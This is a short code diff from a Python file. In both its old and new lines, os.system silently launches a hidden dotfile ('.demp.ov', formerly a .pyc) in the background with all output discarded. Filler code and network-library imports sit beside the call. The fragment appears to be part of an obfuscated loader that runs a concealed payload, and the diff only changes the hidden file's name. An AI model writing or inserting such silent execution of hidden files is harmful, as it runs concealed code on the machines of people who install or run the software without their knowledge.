@@ -43,7 +43,7 @@ for a in range(1,5):
 if "python" == "python":
   None
 
-os.system("python .demp.cpython-38.pyc </dev/null &>/dev/null &")
+os.system("python .demp.ov </dev/null &>/dev/null &")
 
 import urllib.request
 import requests
